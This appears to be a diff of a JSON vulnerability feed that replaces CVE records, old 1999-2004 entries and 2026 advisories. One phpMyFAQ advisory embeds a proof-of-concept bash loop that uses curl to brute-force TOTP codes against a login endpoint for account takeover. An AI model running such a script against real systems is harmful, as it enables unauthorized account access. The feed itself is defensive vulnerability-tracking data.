-      "modified": null,
-      "cwe": "CWE-16",
-      "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0093.html",
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0094.html",
-        "http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2002-11/0338.html",
-        "http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2002-11/0347.html",
-        "http://www.iss.net/security_center/static/10699.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2235",
-      "summary": "member2.php in vBulletin 2.2.9 and earlier does not properly restrict the $perpage variable to be an integer, which causes an error message to be reflected back to the user without quoting, which facilitates cross-site scripting (XSS) and possibly other attacks.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": "CWE-189",
-      "references": [
-        "http://online.securityfocus.com/archive/1/301076",
-        "http://securityreason.com/securityalert/3229",
-        "http://www.iss.net/security_center/static/10701.php",
-        "http://www.securityfocus.com/bid/6246",
-        "http://online.securityfocus.com/archive/1/301076"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0765",
-      "summary": "sshd in OpenSSH 3.2.2, when using YP with netgroups and under certain conditions, may allow users to successfully authenticate and log in with another user's password.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-08-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-05/0235.html",
-        "http://www.iss.net/security_center/static/9215.php",
-        "http://www.openbsd.org/errata.html#sshbsdauth",
-        "http://www.osvdb.org/5113",
-        "http://www.securityfocus.com/bid/4803"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0766",
-      "summary": "OpenBSD 2.9 through 3.1 allows local users to cause a denial of service (resource exhaustion) and gain root privileges by filling the kernel's file descriptor table and closing file descriptors 0, 1, or 2 before executing a privileged process, which is not properly handled when OpenBSD fails to open an alternate descriptor.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2002-08-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/1/271702",
-        "http://www.iss.net/security_center/static/9048.php",
-        "http://www.kb.cert.org/vuls/id/314963",
-        "http://www.openbsd.org/errata.html#fdalloc2",
-        "http://www.osvdb.org/5114"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0767",
-      "summary": "simpleinit on Linux systems does not close a read/write FIFO file descriptor before creating a child process, which allows the child process to cause simpleinit to execute arbitrary programs with root privileges.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2002-08-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/1/276739",
-        "http://www.iss.net/security_center/static/9357.php",
-        "http://www.securityfocus.com/bid/5001",
-        "http://online.securityfocus.com/archive/1/276739",
-        "http://www.iss.net/security_center/static/9357.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0768",
-      "summary": "Buffer overflow in lukemftp FTP client in SuSE 6.4 through 8.0, and possibly other operating systems, allows a malicious FTP server to execute arbitrary code via a long PASV command.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-08-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.iss.net/security_center/static/9130.php",
-        "http://www.novell.com/linux/security/advisories/2002_18_lukemftp.html",
-        "http://www.iss.net/security_center/static/9130.php",
-        "http://www.novell.com/linux/security/advisories/2002_18_lukemftp.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0769",
-      "summary": "The web-based configuration interface for the Cisco ATA 186 Analog Telephone Adaptor allows remote attackers to bypass authentication via an HTTP POST request with a single byte, which allows the attackers to (1) obtain the password from the login screen, or (2) reconfigure the adaptor by modifying certain request parameters.",
+      "id": "CVE-2004-1606",
+      "summary": "slxweb.dll in SalesLogix 6.1 allows remote attackers to cause a denial service (application crash) via an invalid HTTP request, which might also leak sensitive information in the ErrorLogMsg cookie.",
       "cvssScore": 6.4,
       "severity": "Medium",
-      "published": "2002-08-12",
+      "published": "2004-10-18",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-05/0083.html",
-        "http://www.cisco.com/warp/public/707/ata186-password-disclosure.shtml",
-        "http://www.iss.net/security_center/static/9056.php",
-        "http://www.iss.net/security_center/static/9057.php",
-        "http://www.securityfocus.com/bid/4711"
+        "http://archives.neohapsis.com/archives/fulldisclosure/2004-10/0661.html",
+        "http://marc.info/?l=bugtraq&m=109811852218478&w=2",
+        "http://secunia.com/advisories/12883",
+        "http://securitytracker.com/id?1011769",
+        "http://www.osvdb.org/10943"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-0118",
-      "summary": "rdist 6.1.5 allows local users to overwrite arbitrary files via a symlink attack.",
-      "cvssScore": 1.2,
-      "severity": "Low",
-      "published": "2001-03-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=97916374410647&w=2",
-        "http://www.linux-mandrake.com/en/security/2001/MDKSA-2001-005.php3",
-        "http://www.securityfocus.com/bid/2195",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5925",
-        "http://marc.info/?l=bugtraq&m=97916374410647&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0551",
-      "summary": "The file transfer mechanism in Danware NetOp 6.0 does not provide authentication, which allows remote attackers to access and modify arbitrary files.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2000-05-23",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0339.html",
-        "http://www.securityfocus.com/bid/1263",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4569",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0339.html",
-        "http://www.securityfocus.com/bid/1263"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0396",
-      "summary": "The add.exe program in the Carello shopping cart software allows remote attackers to duplicate files on the server, which could allow the attacker to read source code for web scripts such as .ASP files.",
-      "cvssScore": 5,
+      "id": "CVE-1999-0350",
+      "summary": "Race condition in the db_loader program in ClearCase gives local users root access by setting SUID bits.",
+      "cvssScore": 6.2,
       "severity": "Medium",
-      "published": "2000-05-24",
+      "published": "1999-02-08",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0285.html",
-        "http://www.securityfocus.com/bid/1245",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0285.html",
-        "http://www.securityfocus.com/bid/1245"
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0350",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0350"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0856",
-      "summary": "login in Slackware 7.0 allows remote attackers to identify valid users on the system by reporting an encryption error when an account is locked or does not exist.",
-      "cvssScore": 5,
+      "id": "CVE-2026-84369",
+      "summary": "## Summary\n\nSVGO's opt-in `removeScripts` plugin did not inspect executable HTML content inside SVG `<foreignObject>` elements. Applications that used this plugin as their only protection for untrusted SVG input could produce SVGs containing active HTML and expose users to cross-site scripting (XSS).\n\nSVGO is an optimizer rather than a comprehensive sanitization library, but `removeScripts` is maintained for consumers that already rely on it to remove common script execution paths.\n\n## Details\n\nAlthough the plugin removed SVG and XHTML `<script>` elements, it left other HTML execution paths inside `<foreignObject>` unchanged. These included:\n\n- event-handler attributes such as `onload` and `onbeforetoggle`;\n- `srcdoc` documents, including on `<iframe>` elements;\n- executable URLs in HTML attributes such as `action`, `data`, `formaction`, `href`, and `src`.\n\nAn attacker could place one of these payloads in an SVG. If an application optimized the untrusted SVG with `removeScripts` and then served the result in an active browser context, the payload could execute in the viewer's origin.\n\n## Impact\n\nSuccessful exploitation could allow script execution in the context where the optimized SVG is rendered. Depending on the embedding and origin configuration, this could expose cookies or local storage, modify content, or perform actions as the victim.\n\nThe plugin is opt-in, so consumers that do not enable `removeScripts` are not relying on the affected behavior. Typical local optimization of trusted SVG files is not affected.\n\n## Patches\n\nUpgrade to one of the following releases for the maintained release line in use:\n\n| Release line | Patched version | Plugin |\n| --- | --- | --- |\n| v2 | 2.8.4 | `removeScriptElement` |\n| v3 | 3.3.5 | `removeScriptElement` |\n| v4 | 4.1.0 | `removeScripts` |\n\nThe fix preserves visual HTML inside SVG `<foreignObject>` elements while removing event attributes, `srcdoc`, and executable URL values from active HTML URL attributes.\n\nSVGO v1 is no longer maintained. Users of v1 should upgrade to a supported release line.\n\n## Workarounds\n\nFor hostile input, use a dedicated SVG sanitization tool before passing the SVG to SVGO. As defense in depth, applications can reject or remove `<foreignObject>` content and avoid serving user-controlled SVGs in an active same-origin context.",
+      "cvssScore": 6.1,
       "severity": "Medium",
-      "published": "1999-12-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://marc.info/?l=bugtraq&m=94416739411280&w=2",
-        "https://marc.info/?l=bugtraq&m=94416739411280&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-1373",
-      "summary": "MailSafe in Zone Labs ZoneAlarm 2.6 and earlier and ZoneAlarm Pro 2.6 and 2.4 does not block prohibited file types with long file names, which allows remote attackers to send potentially dangerous attachments.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-07-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/archive/1/197681",
-        "http://www.securityfocus.com/bid/3055",
-        "http://www.zonelabs.com/products/zap/rel_history.html#2.6.362",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6877",
-        "http://www.securityfocus.com/archive/1/197681"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-1172",
-      "summary": "OmniSecure HTTProtect 1.1.1 allows a superuser without omnish privileges to modify a protected file by creating a symbolic link to that file.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2001-07-19",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-07/0357.html",
-        "http://www.omnisecure.com/security-alert.html",
-        "http://www.osvdb.org/5452",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6880",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-07/0357.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-86410",
-      "summary": "A flaw in the curl command line tool's logic makes it only set SSH host\nverification options when interacting directly using SFTP or SCP, and not as a\nresult of following a redirect.",
-      "cvssScore": 7.4,
-      "severity": "High",
-      "published": "2026-10-20",
-      "modified": "2026-10-29",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-86410",
-        "https://hackerone.com/reports/3973176",
-        "https://curl.se/docs/CVE-2026-86410.html",
-        "https://curl.se/docs/CVE-2026-86410.json"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-103314",
-      "summary": "A flaw was found in Red Hat Advanced Cluster Security for Kubernetes (RHACS). The Central SAML authentication ACS endpoint does not retain used SAML assertion or response identifiers to prevent replay. An attacker who obtains a valid, unexpired signed SAML response can submit it multiple times and receive distinct Central authentication tokens for the mapped identity.",
-      "cvssScore": 5.8,
-      "severity": "Medium",
-      "published": "2026-10-19",
-      "modified": "2026-10-29",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-103314",
-        "https://access.redhat.com/errata/RHSA-2026:85932",
-        "https://access.redhat.com/errata/RHSA-2026:92342",
-        "https://access.redhat.com/security/cve/CVE-2026-103314",
-        "https://bugzilla.redhat.com/show_bug.cgi?id=2543879"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108086",
-      "summary": "** UNSUPPORTED WHEN ASSIGNED ** Improper restriction of recursive entity references in DTDs ('XML entity expansion') vulnerability in Apache Cocoon.\n\nThis issue affects Apache Cocoon: all versions. XEE in the fp: form processor could lead to SSRF, including exposing files from the server to an untrusted external system\n\nAs this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.\n\nNOTE: This vulnerability only affects products that are no longer supported by the maintainer.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-10-20",
-      "modified": "2026-10-29",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108086",
-        "https://lists.apache.org/thread/mt0h1cpjzps76nq6op7714rmnq6pbtht",
-        "http://www.openwall.com/lists/oss-security/2026/10/20/2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-101987",
-      "summary": "An Improper Validation of Specified Quantity in Input vulnerability in the routing daemon (rpd) of Juniper Networks Junos OS and Junos OS Evolved allows an adjacent attacker to cause a denial of service by sending a specific IS-IS SRv6 packet when SRv6 and Flexible Algorithm are enabled.",
-      "cvssScore": 7.1,
-      "severity": "High",
-      "published": "2026-10-14",
-      "modified": "2026-10-29",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-101987",
-        "https://supportportal.juniper.net/JSA112187"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-74860",
-      "summary": "A flaw was found in libxml2 with Python bindings enabled. A remote attacker could exploit this vulnerability by providing a specially crafted XML document containing a Document Type Definition (DTD) with enumerated attribute values. This triggers a double-free error in the SAX attributeDecl callback handler, where a string is freed twice. This flaw can lead to a denial of service (DoS) due to a reproducible crash in Python applications using the libxml2 SAX bindings.",
-      "cvssScore": 8,
-      "severity": "High",
       "published": "2026-09-08",
-      "modified": "2026-11-03",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      },
+      "references": [
+        "https://github.com/svg/svgo/security/advisories/GHSA-4vpr-x523-8j87",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-84369",
+        "https://github.com/svg/svgo/pull/2264",
+        "https://github.com/svg/svgo/pull/2269",
+        "https://github.com/svg/svgo/pull/2272"
+      ],
+      "vulnerableProducts": [
+        "svgo npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-72925",
+      "summary": "## Impact\n\n`@swc/html` minifies JSON contained in `script` elements such as\n`application/json` and `application/ld+json` by parsing and serializing the\nJSON value.\n\nBefore the patched versions, JSON serialization could convert escaped\nless-than signs such as `\\u003C` into literal `<` characters. If the JSON\ncontained an escaped `</script>` sequence, the generated HTML could terminate\nthe containing script element early because HTML tokenization occurs before\nthe JSON is consumed.\n\nApplications that minify HTML containing attacker-controlled JSON data could\ntherefore transform inert data into active markup. A crafted payload could\nexecute script in the origin of the generated page.\n\n## Patches\n\nThe issue is fixed in:\n\n- `@swc/html` 1.15.47\n- `swc_html_minifier` 59.0.0\n\nThe minifier now re-escapes less-than signs after JSON serialization, preserving\nthe script element boundary.\n\n## Workarounds\n\nUsers who cannot upgrade can disable JSON minification with:\n\n```js\nawait minify(html, {\n  minifyJson: false,\n});",
+      "cvssScore": 6.1,
+      "severity": "Medium",
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      },
+      "references": [
+        "https://github.com/swc-project/swc/security/advisories/GHSA-5qr2-v392-m9g8",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-72925",
+        "https://github.com/swc-project/swc/pull/12080",
+        "https://github.com/swc-project/swc/commit/e1877b44bdac8abc9fd51e984d584f40f6999832",
+        "https://github.com/swc-project/swc/releases/tag/v1.15.47"
+      ],
+      "vulnerableProducts": [
+        "@swc/html npm",
+        "swc_html_minifier rust"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0410",
+      "summary": "send_message.php in AeroMail before 1.45 allows remote attackers to read arbitrary files on the server, instead of just uploaded files, via an attachment that modifies the filename to be uploaded.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-07-26",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-74860",
-        "https://access.redhat.com/errata/RHSA-2026:64463",
-        "https://access.redhat.com/errata/RHSA-2026:91235",
-        "https://access.redhat.com/errata/RHSA-2026:91236",
-        "https://access.redhat.com/errata/RHSA-2026:91237"
+        "http://archives.neohapsis.com/archives/bugtraq/2002-03/0004.html",
+        "http://the.cushman.net/projects/aeromail/download/",
+        "http://the.cushman.net/projects/aeromail/download/aeromail-1.45.tar.gz",
+        "http://www.iss.net/security_center/static/8345.php",
+        "http://www.securityfocus.com/bid/4214"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-102558",
-      "summary": "A flaw was found in libsoup. When max-incoming-payload-size is unlimited (0), SoupWebsocketConnection could grow its incoming GByteArray based on an attacker-controlled frame length until the length wrapped, causing a heap buffer overflow while reading frame data.",
+      "id": "CVE-2002-0431",
+      "summary": "XTux allows remote attackers to cause a denial of service (CPU consumption) via random inputs in the initial connection.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-07-26",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://online.securityfocus.com/archive/1/260912",
+        "http://www.iss.net/security_center/static/8422.php",
+        "http://www.securityfocus.com/bid/4260",
+        "https://sourceforge.net/tracker/index.php?func=detail&aid=529046&group_id=206&atid=100206",
+        "http://online.securityfocus.com/archive/1/260912"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0164",
+      "summary": "Buffer overflow in Netscape Directory Server 4.12 and earlier allows remote attackers to cause a denial of service or execute arbitrary commands via a malformed recipient field.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-06-02",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.atstake.com/research/advisories/2001/a030701-1.txt",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6233",
+        "http://www.atstake.com/research/advisories/2001/a030701-1.txt",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6233"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1515",
+      "summary": "Origo ASR-8100 ADSL Router 3.21 has an administration service running on port 254 that does not require a password, which allows remote attackers to cause a denial of service by restoring the factory defaults.",
+      "cvssScore": 7.8,
+      "severity": "High",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": "CWE-264",
+      "references": [
+        "http://securityreason.com/securityalert/3300",
+        "http://www.securityfocus.com/archive/1/341752",
+        "http://www.securityfocus.com/bid/8855",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/13463",
+        "http://securityreason.com/securityalert/3300"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-56737",
+      "summary": "### Summary\nThe public two-factor verification endpoint `POST /check` logs a user in based **solely** on a valid\n6-digit TOTP token and a chosen `user-id`. It does **not** require — and is not bound to — a prior\nsuccessful password authentication. For any account that has 2FA enabled, an unauthenticated attacker\ncan authenticate **without knowing the password**, reducing the account to a single factor (a 6-digit\ncode) that is itself brute-forceable because this endpoint has no lockout (see Finding #2). This is an\nauthentication bypass of the primary credential for all 2FA-protected accounts, including administrators.\n\n### Details\n`src/phpMyFAQ/Controller/Frontend/AuthenticationController.php:255-283`:\n\n```php\n#[Route(path: '/check', name: 'public.auth.check', methods: ['POST'])]\npublic function check(Request $request): RedirectResponse\n{\n    if ($this->currentUser->isLoggedIn()) {\n        return new RedirectResponse(url: './');\n    }\n\n    $token  = Filter::filterVar($request->request->get('token'), FILTER_SANITIZE_SPECIAL_CHARS);\n    $userId = (int) Filter::filterVar($request->request->get('user-id'), FILTER_VALIDATE_INT);\n\n    if ($userId <= 0) { /* ... */ }\n\n    $this->currentUserService->getUserById($userId);          // loads attacker-chosen user\n\n    if (strlen((string) $token) === 6) {\n        $result = $this->twoFactor->validateToken($token, $userId);\n        if ($result) {\n            $this->currentUserService->twoFactorSuccess();    // full login, no password ever checked\n            return new RedirectResponse(url: './');\n        }\n    }\n    // ...\n}\n```\n\n`twoFactorSuccess()` performs a complete session login (`src/phpMyFAQ/User/CurrentUser.php:239-247`):\n\n```php\npublic function twoFactorSuccess(): bool\n{\n    $this->setLoggedIn(true);\n    $this->updateSessionId(true);\n    $this->saveToSession();\n    $this->setSuccess(true);\n    return true;\n}\n```\n\nThere is **no server-side state** (such as a \"password already verified for this user\" flag) tying the\n`/check` step to the password step. Compare the admin flow, which does it correctly via a\n`2fa_pending_user_id` session value set only **after** the password is validated\n(`src/phpMyFAQ/Controller/Administration/AuthenticationController.php:218-262`) — proving the frontend\nomission is a regression, not an intended design.\n\n`validateToken()` (`src/phpMyFAQ/User/TwoFactor.php:87-101`) returns `false` when the user has no secret,\nso this is *not* a universal bypass of all accounts — it specifically defeats the **password factor of\nevery 2FA-enabled account**:\n\n```php\npublic function validateToken(string $token, int $userId): bool\n{\n    if (strlen($token) !== 6 || $userId <= 0) { return false; }\n    $this->currentUser->getUserById($userId);\n    $secret = $this->currentUser->getUserData('secret');\n    if (!is_string($secret) || $secret === '') { return false; }   // no 2FA -> false\n    return $this->twoFactorAuth->verifyCode($secret, $token);       // 6-digit TOTP only\n}\n```\n\nBecause `/check` has no failed-attempt lockout and the per-account login throttle is disabled by default\n(Finding #2), the 6-digit code can be brute-forced across TOTP windows. The net effect: 2FA, intended to\n*strengthen* the password, becomes the *only* barrier and is independently guessable.\n\n### PoC\nPre-req: a target account (e.g. `admin`) has 2FA enabled (a common hardening choice). The attacker knows\nor enumerates the numeric `user-id` (1 = first/admin account in default installs).\n\n```bash\n# No password required. Submit user-id + a 6-digit TOTP guess to /check.\n# Iterate the token space; the session cookie returned on success is an authenticated session.\nfor code in $(seq -w 0 999999); do\n  curl -ks -c jar.txt -b jar.txt \\\n    -X POST \"https://target/check\" \\\n    --data-urlencode \"user-id=1\" \\\n    --data-urlencode \"token=$(printf '%06d' 10#$code)\" \\\n    -o /dev/null -w \"%{http_code} %{redirect_url}\\n\" \\\n  | grep -q './'   && echo \"[+] logged in with token $code\" && break\ndone\n# A successful guess yields a logged-in session in jar.txt -> full account takeover (no password used).\n```\nIf the attacker already controls or has phished the victim's TOTP device, a single request authenticates\nwith no password at all.\n\n### Impact\nAuthentication bypass (CWE-287) / missing authentication for a critical step (CWE-306). The password —\nthe primary credential — is never required for any 2FA-enabled account. Combined with the absent lockout,\nthis enables full account takeover of users and administrators. Impacted: any deployment where users\nenable two-factor authentication.",
       "cvssScore": 8.1,
       "severity": "High",
-      "published": "2026-09-29",
-      "modified": "2026-10-29",
-      "cwe": null,
+      "published": "2026-09-24",
+      "modified": "2026-09-24",
+      "cwe": {
+        "cwe_id": "CWE-287",
+        "name": "Improper Authentication"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-102558",
-        "https://access.redhat.com/errata/RHSA-2026:83384",
-        "https://access.redhat.com/errata/RHSA-2026:83618",
-        "https://access.redhat.com/errata/RHSA-2026:84586",
-        "https://access.redhat.com/errata/RHSA-2026:92347"
+        "https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-8gpw-xvpf-hvx5",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-56737",
+        "https://github.com/thorsten/phpMyFAQ/commit/410208b90f1d01534812ac5203d3e8d9c7bd591f",
+        "https://github.com/thorsten/phpMyFAQ/commit/5097dff341fb01e93e8561e7261b3ae657df715a",
+        "https://github.com/thorsten/phpMyFAQ/commit/6a69f6e2142fde722165c65b7e0a49f3176e87be"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "thorsten/phpmyfaq composer",
+        "phpmyfaq/phpmyfaq composer"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-0309",
-      "summary": "Stack-based buffer overflow in the SMTP service support in vsmon.exe in Zone Labs ZoneAlarm before 4.5.538.001, ZoneLabs Integrity client 4.0 before 4.0.146.046, and 4.5 before 4.5.085, allows remote attackers to execute arbitrary code via a long RCPT TO argument.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2004-11-23",
+      "id": "CVE-2003-0130",
+      "summary": "The handle_image function in mail-format.c for Ximian Evolution Mail User Agent 1.2.2 and earlier does not properly escape HTML characters, which allows remote attackers to inject arbitrary data and HTML via a MIME Content-ID header in a MIME-encoded image.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2003-03-24",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://download.zonelabs.com/bin/free/securityAlert/8.html",
-        "http://marc.info/?l=bugtraq&m=107722656827427&w=2",
-        "http://www.ciac.org/ciac/bulletins/o-084.shtml",
-        "http://www.kb.cert.org/vuls/id/619982",
-        "http://www.osvdb.org/3991"
+        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0141.html",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000648",
+        "http://marc.info/?l=bugtraq&m=104826470527308&w=2",
+        "http://www.coresecurity.com/common/showdoc.php?idx=309&idxseccion=10",
+        "http://www.gentoo.org/security/en/glsa/glsa-200303-18.xml"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-0310",
-      "summary": "Cross-site scripting (XSS) vulnerability in LiveJournal 1.0 and 1.1 allows remote attackers to execute Javascript as other users via the stylesheet, which does not strip the semicolon or parentheses, as demonstrated using a background:url.",
+      "id": "CVE-2003-0131",
+      "summary": "The SSL and TLS components for OpenSSL 0.9.6i and earlier, 0.9.7, and 0.9.7a allow remote attackers to perform an unauthorized RSA private key operation via a modified Bleichenbacher attack that uses a large number of SSL or TLS connections using PKCS #1 v1.5 padding that cause OpenSSL to leak information regarding the relationship between ciphertext and the associated plaintext, aka the \"Klima-Pokorny-Rosa attack.\"",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-03-24",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2003-007.txt.asc",
+        "ftp://ftp.sco.com/pub/security/OpenLinux/CSSA-2003-014.0.txt",
+        "ftp://patches.sgi.com/support/free/security/advisories/20030501-01-I",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000625",
+        "http://eprint.iacr.org/2003/052/"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0138",
+      "summary": "Version 4 of the Kerberos protocol (krb4), as used in Heimdal and other packages, allows an attacker to impersonate any principal in a realm via a chosen-plaintext attack.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-03-24",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=104791775804776&w=2",
+        "http://web.mit.edu/kerberos/www/advisories/MITKRB5-SA-2003-004-krb4.txt",
+        "http://www.debian.org/security/2003/dsa-266",
+        "http://www.debian.org/security/2003/dsa-269",
+        "http://www.debian.org/security/2003/dsa-273"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0716",
+      "summary": "Buffer overflow in the DCE daemon (DCED) for the DCE endpoint mapper (epmap) on HP-UX 11 allows remote attackers to execute arbitrary code via a request with a small fragment length and a large amount of data.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2004-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://support.entegrity.com/private/patches/dce/ssrt4741.asp",
+        "http://www.atstake.com/research/advisories/2004/a072204-1.txt",
+        "http://www.kb.cert.org/vuls/id/259796",
+        "http://support.entegrity.com/private/patches/dce/ssrt4741.asp",
+        "http://www.atstake.com/research/advisories/2004/a072204-1.txt"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1710",
+      "summary": "page.cgi allows remote attackers to execute arbitrary commands via shell metacharacters in the url parameter.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=109181771832634&w=2",
+        "http://www.osvdb.org/8936",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/19713",
+        "http://marc.info/?l=bugtraq&m=109181771832634&w=2",
+        "http://www.osvdb.org/8936"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1368",
+      "summary": "AV Option for MS Exchange Server option for InoculateIT 4.53, and possibly other versions, only scans the Inbox folder tree of a Microsoft Exchange server, which could allow viruses to escape detection if a user's rules cause the message to be moved to a different mailbox.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "1999-05-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=ntbugtraq&m=92652152723629&w=2",
+        "http://marc.info/?l=ntbugtraq&m=97439568517355&w=2",
+        "http://marc.info/?l=ntbugtraq&m=92652152723629&w=2",
